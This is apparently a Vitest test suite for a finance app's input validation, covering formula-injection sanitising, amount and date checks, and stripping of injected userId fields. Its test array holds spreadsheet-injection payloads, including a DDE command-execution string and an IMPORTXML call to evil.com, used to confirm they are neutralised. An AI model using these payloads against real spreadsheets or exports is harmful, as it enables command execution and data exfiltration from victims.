import { describe, it, expect } from 'vitest';
import {
  TransactionCreateSchema,
  BudgetUpsertSchema,
  sanitizeFormulaString,
} from '@/validations';

describe('Security & Validation Defenses', () => {
  it('neutralizes spreadsheet / formula injection attempts in text inputs', () => {
    // Malicious formula injection attacks
    const maliciousPayloads = [
      '=cmd|"/C calc"!A0',
      '+12345',
      '-@SUM(A1:A10)',
      '@IMPORTXML("http://evil.com","//a")',
      '\t=1+1',
    ];

    for (const payload of maliciousPayloads) {
      const sanitized = sanitizeFormulaString(payload);
      // Must start with single quote to deactivate formula execution in Google Sheets
      expect(sanitized.startsWith("'")).toBe(true);
    }

    // Normal strings should remain unchanged
    expect(sanitizeFormulaString('Grocery store purchase')).toBe('Grocery store purchase');
  });

  it('rejects negative or zero transaction amounts', () => {
    const invalidNegative = {
      accountId: 'acc-1',
      type: 'expense',
      amountMinor: -5000,
      currency: 'PHP',
      transactionDate: '2026-10-08',
    };
    expect(() => TransactionCreateSchema.parse(invalidNegative)).toThrow();

    const invalidZero = {
      ...invalidNegative,
      amountMinor: 0,
    };
    expect(() => TransactionCreateSchema.parse(invalidZero)).toThrow();

    const validPositive = {
      ...invalidNegative,
      amountMinor: 15000,
    };
    expect(() => TransactionCreateSchema.parse(validPositive)).not.toThrow();
  });

  it('rejects malformed dates', () => {
    const invalidDate = {
      accountId: 'acc-1',
      type: 'income',
      amountMinor: 10000,
      currency: 'PHP',
      transactionDate: '10/08/2026', // Wrong format, requires YYYY-MM-DD
    };
    expect(() => TransactionCreateSchema.parse(invalidDate)).toThrow();
  });

  it('rejects negative budget amounts', () => {
    const negativeBudget = {
      period: 'monthly',
      year: 2026,
      month: 10,
      amountMinor: -100,
      currency: 'PHP',
    };
    expect(() => BudgetUpsertSchema.parse(negativeBudget)).toThrow();
  });

  it('strips or discards unauthorized client userId injections', () => {
    const maliciousInput = {
      userId: 'hacker-stolen-id-99999',
      accountId: 'acc-1',
      type: 'expense' as const,
      amountMinor: 5000,
      currency: 'PHP',
      transactionDate: '2026-10-08',
      description: 'Attempting to inject userId',
    };

    const parsed = TransactionCreateSchema.parse(maliciousInput);
    // Schema should NOT contain userId in its parsed result
    expect((parsed as Record<string, unknown>).userId).toBeUndefined();
  });
});
